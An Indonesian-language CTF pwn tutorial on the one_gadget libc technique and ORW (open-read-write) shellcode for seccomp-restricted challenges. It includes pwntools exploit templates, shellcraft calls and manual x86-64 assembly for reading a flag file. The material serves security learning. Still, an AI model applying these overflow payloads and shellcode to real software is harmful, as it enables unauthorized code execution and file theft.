#cybersecurity

Dua teknik "singkat" yang sering menghemat waktu: **one gadget** (satu alamat → shell) dan **ORW shellcode** (open-read-write saat execve diblokir seccomp).

## One Gadget

Satu alamat di libc yang langsung menjalankan `execve("/bin/sh", ...)` - tidak perlu chain panjang.

```bash
# cari one gadget
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# 0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   address rsp+0x40 is writable
#   ...
```

Pakai di exploit:

```python
from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# setelah leak libc base
libc.address = leak - libc.sym.puts

# coba satu per satu sampai constraint terpenuhi
one_gadget = libc.address + 0x4f2a5
payload = b"A"*offset + p64(one_gadget)
io.sendlineafter(b": ", payload)
io.interactive()
```

Kalau constraint tidak terpenuhi, coba one gadget lain, atau **rapikan stack** dulu (misal tambah ret untuk alignment).

## ORW Shellcode (seccomp)

Challenge modern memakai **seccomp** - hanya syscall tertentu yang diizinkan. Kalau `execve` diblokir, kita tidak bisa dapat shell; gantinya **baca flag langsung** dengan open → read → write.

```bash
# cek syscall yang diizinkan
seccomp-tools dump ./chall
```

### Shellcode ORW

```python
from pwn import *

context.arch = "amd64"

sc = shellcraft.open("flag.txt")          # open("flag.txt") -> rax = fd
sc += shellcraft.read("rax", "rsp", 100)  # read(fd, rsp, 100)
sc += shellcraft.write(1, "rsp", 100)     # write(1, rsp, 100)

payload_sc = asm(sc)
print(payload_sc.hex())
```

### Pakai di exploit (NX off / mmap executable)

```python
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF("./chall")
io = process("./chall")

buf = 0x...  # alamat buffer (executable)
offset = ...

sc = asm(shellcraft.open("flag.txt") +
         shellcraft.read("rax", "rsp", 100) +
         shellcraft.write(1, "rsp", 100))

payload = sc + b"A"*(offset-len(sc)) + p64(buf)
io.sendline(payload)
print(io.recvall())
```

### Shellcode ORW manual (kalau mau paham)

```asm
; open("flag.txt", 0, 0)
lea rdi, [rip+flag]
xor rsi, rsi
xor rdx, rdx
mov rax, 2          ; syscall open = 2
syscall
; read(fd, rsp, 100)
mov rdi, rax
mov rsi, rsp
mov rdx, 100
xor rax, rax        ; syscall read = 0
syscall
; write(1, rsp, 100)
mov rdi, 1
mov rsi, rsp
mov rdx, 100
mov rax, 1          ; syscall write = 1
syscall
flag: .asciz "flag.txt"
```

## Ringkasan kapan pakai

| Situasi | Teknik |
|---|---|
| Ada leak libc, execve boleh | one gadget / ret2libc |
| Seccomp blokir execve | ORW shellcode |
| Seccomp + NX on | ORW via ROP (syscall open/read/write di-chain) |

## Catatan

- One gadget butuh libc yang cocok dengan target.
- `seccomp-tools` wajib dicek sebelum menyusun exploit untuk challenge modern.
- ORW via ROP: chain syscall `open → read → write` memakai gadget `pop rdi/rsi/rdx; ret` + `syscall; ret`.
